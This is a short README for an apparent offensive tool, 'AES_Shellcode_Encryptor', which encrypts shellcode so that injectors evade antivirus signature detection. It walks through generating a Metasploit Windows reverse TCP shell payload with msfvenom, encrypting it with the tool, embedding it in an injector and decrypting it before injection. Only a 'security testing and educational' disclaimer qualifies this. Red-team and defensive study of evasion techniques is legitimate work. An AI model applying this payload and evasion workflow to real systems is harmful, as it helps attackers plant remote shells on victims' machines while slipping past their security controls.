# AES_Shellcode_Encryptor

This repository contains a tool that can encrypt all type of files and give the encrypted output in the form of an encrypted shellcode. 
Process of encrypting shellcode is very important for injection processes to bypass signature based detection by the security controls.
Consider an example of using a highly detected metasploit backdoor shellcode. Now for injecting such a shellcode, we need obfuscation to bypass detection by antiviruses. 
This tool helps us in encrypting that shellcode which will be saved in the injector and decrypted just before injection.

DISCLAIMER: For security testing and educational purposes only !!!

Example:
1) create a metasploit shellcode:
msfvenom -p windows/shell_reverse_tcp LHOST=$LOCALIP LPORT=443 -f raw -o shellcode.bin
2) enceypt it with this tool:
AES_Shellcode_Encryptor.exe shellcode.bin encrypted_code.txt mySecretEncryptionKey
3) add encrypted shellcode inside the injector
4) decrypt it with the key before injection
